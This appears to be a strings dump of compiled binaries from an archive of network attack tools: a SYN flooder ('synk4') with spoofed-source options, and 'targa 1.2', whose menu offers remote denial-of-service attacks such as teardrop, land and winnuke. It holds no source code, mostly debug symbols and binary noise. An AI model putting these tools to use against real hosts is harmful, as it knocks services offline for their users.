            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "duy.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "echo_connect",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/synk4",
            "0100755",
            "0000000",
            "0000000",
            "00000042131",
            "07101435615",
            "013131",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "random",
            "memcpy",
            "perror",
            "malloc",
            "socket",
            "fflush",
            "fprintf",
            "__deregister_frame_info",
            "rand",
            "signal",
            "htonl",
            "sendto",
            "gettimeofday",
            "memset",
            "time",
            "gethostbyname",
            "sprintf",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "GLIBC_2.0",
            "`1^PTRh",
            "E1fE",
            "fE1fu",
            "e[^]",
            "1fRY",
            " }-hh",
            "fEfE9",
            "M@eM",
            "fEfE",
            "fE\u03031fEP]",
            "fE\u0383h9h7(g",
            "eeee\u07c0e?h",
            "fEfE",
            "EPEP*",
            ":h7(",
            "E|*E/$t&",
            "E\u020bU\u0309)\u0449M}",
            "E;Er",
            "E\u0309EE;Ev",
            "M\u070bU\u0709\u0449",
            ")\u0449M}",
            "M\u060bU\u0609\u0449",
            ")\u0449M\u0603EPEPEPEPh",
            "E\u04031fEPEPEP",
            "E@MA\u0449Mu",
            "EE\\t&",
            "\u0403;u[]",
            "[JSignal Caught. Exiting Cleanly.",
            "[JSegmentation Violation Caught. Exiting Cleanly.",
            "Unknown host %s",
            "Error sending syn packet.",
            "[1;30m[",
            "[1;31m%c",
            "[1;30m]",
            "[0m %d",
            "Usage: %s srcaddr dstaddr low high num",
            "    If srcaddr is 0, random addresses will be used",
            "socket (raw)",
            "socket",
            "Copyright (c) 1980, 1983, 1986, 1988, 1990, 1991 The Regents of the University",
            " of California. All Rights Reserved.",
            "%i.%i.%i.%i",
            "High port must be greater than Low port.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "synk4.c",
            "send_tcp_segment",
            "srcport",
            "ip_sum",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "spoof_open",
            "fprintf@@GLIBC_2.0",
            "signal@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "sock",
            "htonl@@GLIBC_2.0",
            "getaddr",
            "upsc",
            "random@@GLIBC_2.0",
            "sig_segv",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "send_seq",
            "stdout@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "curc",
            "ack_seq",
            "__bss_start",
            "main",
            "ssock",
            "__libc_start_main@@GLIBC_2.0",
            "sig_exit",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gettimeofday@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "flood",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "init_signals",
            "__gmon_start__",
            "datapool/bin/targa",
            "0100755",
            "0000000",
            "0000000",
            "00000070106",
            "07100656717",
            "013171",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "random",
            "connect",
            "getopt_long",
            "memcpy",
            "perror",
            "malloc",
            "optarg",
            "socket",
            "bzero",
            "send",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "rand",
            "strncpy",
            "htonl",
            "sendto",
            "bcopy",
            "sscanf",
            "memset",
            "inet_ntoa",
            "time",
            "gethostbyname",
            "sprintf",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "QVh\u040a",
            "EP& }!h",
            "REPa",
            "REPE",
            "EPG ",
            "E}u\t",
            "Ent0n",
            "ht>Ott",
            "EPPh`",
            "EPE EPh",
            "E;E|",
            "EPEPD",
            "EZh+",
            "UuBE",
            "u\t1+t&",
            "REPEP",
            "14t&",
            "P EU",
            "]U(E5",
            "P  }",
            "E;E|",
            "EPEPEP(P",
            "Pj h",
            "E\ubc09]U",
            "Shdd",
            "E;<~",
            "Lf\u01c5H",
            "ddfY",
            "hPEPK }-DPh\u077e",
            "fEfE",
            "f9Er",
            " 1fE",
            "fE\u0489fE",
            "]UxEEEP",
            "t$EP",
            "Uu$E",
            "1fRf",
            "fUfu",
            "j(EP",
            "EfUf",
            "EfUfP",
            "j EP",
            "EEEEE",
            "j EP8",
            "j(EPEP u",
            "E\ub649EP",
            "U4SE",
            "u&h@",
            ")\u044bE)fEE\u0739",
            ")\u044bE)fEE",
            "EEEEE",
            "E;E|",
            "1fEP1fEPEPEPEP*",
            "U@VSE",
            "fEfUE",
            "fEfE\u078bE",
            "EEEh",
            "EPEPc",
            "EPE@P",
            "1fEPF",
            "1fEP(",
            "U\u0709Pj",
            "j&EPE",
            "P u2hx",
            "EPEP",
            "EPE@Pu",
            "1fEP",
            "1fEP",
            "U\u0709Pj",
            "Pv u0hx",
            "EEhD",
            "EPEP|",
            "EPE@P",
            "E,1fEPd",
            "1fEPF",
            "QE\u060bUM",
            "E\u053bE\u044bE\u060d",
            ")\u02cbE)\u060bU\u0508",
            "EE\ub989j",
            "U\u0709Pj",
            "P u,hx",
            "e[^]",
            "Uu>E",
            "1'EP",
            "REPEP",
            "U4SE",
            "u#h@",
            ")\u044bE)fE}E\u0739",
            ")\u044bE)fEE",
            "EEEEE",
            "E;E|",
            "1fEP1fEPEPEPEP*",
            "U4SE",
            "fEfUE",
            "fEfEE",
            "EEEj0EP3",
            "EPEP",
            "EPE@Pk",
            "1fEP",
            "1fEP",
            "j0EPE",
            "Po u,hx",
            "P u0hx",
            "U4SE",
            "EP% } h",
            "u&h@",
            ")\u044bE)fE",
            ")\u044bE)fEE",
            "EE\u060bEEE",
            "E;E|",
            "EPEP1fEP1fEPEPEPEP.",
            "U4SE",
            "fEfUE",
            "fEfEE",
            "Ej03",
            "EEEj0EP",
            "EPEP~",
            "EPE@P",
            "1fEPa",
            "1fEPC",
            "EEU M",
            "j<EPE",
            "P u,hx",
            "]EU ",
            "P# u-hx",
            "U4SE",
            "EPs }",
            "u&h@",
            ")\u044bE)fEmE\u0739",
            ")\u044bE)fEE",
            "EEEEE",
            "E;E|",
            "1fEP1fEPEPEPEP*",
            "U4SE",
            "fEfUE",
            "fEfEE",
            "EEEj8EP#",
            "EPEP",
            "EPE@P[",
            "1fEP",
            "1fEP",
            "j8EPE",
            "P_ u,hx",
            "P u0hx",
            "E1fE",
            "t%EP",
            "u&h\u023f",
            "\u0403;u[]",
            "[0;33mtarga 1.2 by ",
            "[1;33m",
            "[5mMixter",
            "cannot open raw socket",
            "IP_HDRINCL",
            "-help",
            "--help",
            "%d.%d.%d.%d",
            "Error, %s: Please use a start IP containing 4 zones",
            "Zone 1 of start ip is incorrect (greater than 255)",
            "Zone 2 of start ip is incorrect (greater than 255)",
            "Zone 3 of start ip is incorrect (greater than 255)",
            "Zone 4 of start ip is incorret (greater than 255)",
            "Error, %s: Please use an end IP containing 4 zones",
            "Zone 1 of end ip is incorrect (greater than 255)",
            "Zone 2 of end ip is incorrect (greater than 255)",
            "Zone 3 of end ip is incorrect (greater than 255)",
            "Zone 4 of end ip is incorrect (greater than 255)",
            "Zone 1 of start ip and end ip is different",
            "Zone 2 of start ip and end ip is different",
            "Zone 3 of start ip and end ip is different",
            "t:n:h",
            "[1;31mLeet",
            "[0;31mness on f",
            "[1;31mlaxen wing",
            "[0;31ms",
            "[0m:",
            "[1;31mTo",
            "[0m: ",
            "[0;31m%s - %s",
            "[1;31mRepeats",
            "[0m: ",
            "[0;31m%5d",
            "[1;31m   Type",
            "[0m: ",
            "[0;31m%5d",
            "[0;31m%s ",
            "[1;31m[ ",
            "[0;31m ]",
            "[1;31m-all done-",
            "[0;31musage: %s <startIP> <endIP> [-t type] [-n repeats]",
            "[0;31musage: %s <startIP> <endIP> [-t type] [-n repeats]",
            "startIP - endIP: ",
            "[1;31mIP range to send packets to (destination)",
            "[0;31mstart and end must be on the same C class (1.1.1.X)",
            "repeats: ",
            "[1;31mrepeat the whole cycle n times (default is 1)",
            "[0;31mtype: ",
            "[1;31mkind of remote DoS to send (default is 0)",
            "[0;31m1 = bonk (",
            "[1;31m$",
            "[0;31m)  2 = jolt (",
            "[1;32m@",
            "[0;31m)  3 = land (",
            "[1;33m-",
            "[0;31m)",
            "4 = nestea (",
            "[1;34m.",
            "[0;31m)  5 = newtear (",
            "[1;32m#",
            "[0;31m)",
            "6 = syndrop (",
            "[1;35m&",
            "[0;31m)  7 = teardrop (",
            "[1;34m%%",
            "[0;31m)  8 = winnuke (",
            "[1;37m*",
            "[0;31m)",
            "[0;31m0 = use all remote DoS types at once",
            "bad target host",
            "socket()",
            "[1;31m$",
            "socket",
            "%s: unknown host",
            "[1;32m@",
            "offset %d: ",
            "sendto",
            "unknown host %s",
            "couldn't send packet",
            "[1;33m-",
            "raw socket",
            "What the hell kind of IP address is that?",
            "[1;34m.",
            "sendto",
            "[1;32m#",
            "[1;35m&",
            "[1;34m%%",
            "bill_loves_you!",
            "gethostbyname()",
            "connect()",
            "[1;37m*",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
